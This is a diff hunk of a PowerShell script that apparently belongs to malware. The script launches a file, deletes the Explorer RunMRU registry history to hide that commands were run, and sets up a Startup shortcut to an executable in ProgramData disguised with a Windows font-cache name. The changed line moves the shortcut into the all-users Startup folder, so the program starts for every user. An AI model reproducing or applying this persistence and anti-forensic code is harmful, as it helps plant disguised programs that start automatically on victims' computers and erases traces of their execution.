@@ -8,7 +8,7 @@ $exec = New-Object -com shell.application
 $exec.shellexecute($file)
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 $objShell = New-Object -ComObject ("WScript.Shell")
-$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_prod_OTP.lnk")
+$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\AW_OTP.lnk")
 $objShortCut.TargetPath="C:\ProgramData\PresentationFontCache.exe"
 $objShortCut.Save()
 exit
